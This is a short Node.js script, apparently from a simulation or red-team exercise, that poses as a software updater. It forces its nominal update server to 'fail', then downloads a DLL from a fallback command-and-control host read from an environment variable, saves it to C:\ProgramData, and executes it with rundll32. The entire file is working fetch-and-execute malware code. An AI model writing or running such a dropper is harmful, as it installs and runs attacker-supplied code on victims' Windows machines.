const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
require('dotenv').config({ path: '../../.env' });

const primaryUrl = "https://updates.pharma-novatech.com"; 
const fallbackUrl = process.env.FALLBACK_C2; // malicious
const filePath = "C:\\ProgramData\\update-core.dll";

function download(url, callback) {
    // Purposefully fail primary server (simulated infrastructure outage)
    if (url === primaryUrl) {
        return callback(new Error("Primary update endpoint unreachable"));
    }

    https.get(url, (res) => {
        const file = fs.createWriteStream(filePath);
        res.pipe(file);
        file.on('finish', () => {
            file.close(() => callback(null));
        });
    }).on("error", () => callback(new Error("Download failed")));
}

function executeDll() {
    exec(`rundll32.exe ${filePath},#1`, () => {});
}

download(primaryUrl, (err) => {
    if (err) {
        // PRIMARY FAIL → USE MALICIOUS FALLBACK C2
        download(fallbackUrl, (fallbackErr) => {
            if (!fallbackErr) executeDll();
        });
    } else {
        executeDll();
    }
});
